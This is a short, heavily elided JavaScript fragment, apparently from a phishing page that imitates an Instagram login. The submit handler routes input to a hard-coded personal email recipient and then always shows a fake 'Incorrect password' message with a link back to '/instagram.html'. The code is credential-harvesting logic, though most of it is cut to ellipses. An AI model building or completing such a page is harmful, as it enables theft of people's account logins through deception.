...
const handleSubmit = (e) => {
    ...
    setTimeout(()=>{
        ...
        setTimeout(()=>{
            ...
            const recipient = "saikiwisdom@gmail.com";
            ...
            .then(action =>{
                result.innerHTML="<div style='padding: 25px;text-align:center; color:red;'>Incorrect password <a href='/instagram.html'>Login</a></div>";
